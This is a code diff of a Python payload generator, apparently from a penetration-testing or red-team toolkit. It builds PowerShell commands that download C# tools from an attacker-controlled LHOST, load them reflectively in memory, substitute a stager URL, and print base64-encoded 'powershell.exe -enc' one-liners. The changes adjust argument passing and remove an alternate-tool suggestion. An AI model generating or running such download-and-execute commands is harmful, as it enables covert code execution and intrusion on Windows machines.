@@ -36,10 +36,6 @@ def get_tool_cmd(tool, tool_type, args, altcmd=None):
     if 'cmd' in tool.keys():
       cmd = tool['cmd']
 
-
-    if altcmd is not None:
-      cmd = altcmd
-
     s += ';' + cmd
 
   elif tool_type == 'cs':
@@ -49,10 +45,13 @@ def get_tool_cmd(tool, tool_type, args, altcmd=None):
 
     cmd = cmd.replace("STAGER_URL", ak.STAGER_URL)
 
-    if altcmd is not None:
-      cmd = altcmd
+    if len(cmd) > 0:
+      # Arguments must be passed as a list
+      tcmd = f'"{cmd}".Split()'
+      s += ak.PS_REFLECTIVE_WEBCLIENT.format(LHOST=ak.LHOST, tool=tool['location'], tool_class=tool_class, entrypoint=tool_entrypoint, cmd=tcmd )
+    else:
+      s += ak.PS_REFLECTIVE_WEBCLIENT.format(LHOST=ak.LHOST, tool=tool['location'], tool_class=tool_class, entrypoint=tool_entrypoint, cmd="")
 
-    s += ak.PS_REFLECTIVE_WEBCLIENT.format(LHOST=ak.LHOST, tool=tool['location'], tool_class=tool_class, entrypoint=tool_entrypoint, cmd=cmd )
 
   elif tool_type == 'zip':
     s += ak.PS_UNZIP_CMD.format(LHOST=ak.LHOST, tool=tool['location'])
@@ -90,18 +89,11 @@ def main():
 
 
   if args.base64:
+    print("Command encoded: {}".format(s), file=sys.stderr)
     s = b64_encode(s)
-    print("Run with: powershell.exe -enc "+s)
+    print("powershell.exe -enc "+s)
   else:
     print(s + "\n")
-
-  if 'alt' in tool.keys():
-    print("NOTE: Consider using {} tool".format(tool['alt']))
-    atool,atool_type = get_tool(tool['alt'], cs_tools, ps_tools, zip_tools)
-    s = get_tool_cmd(atool, atool_type, args, altcmd=tool['altcmd'])
-    print(s)
-
-
 
 if __name__ == "__main__":
   main()
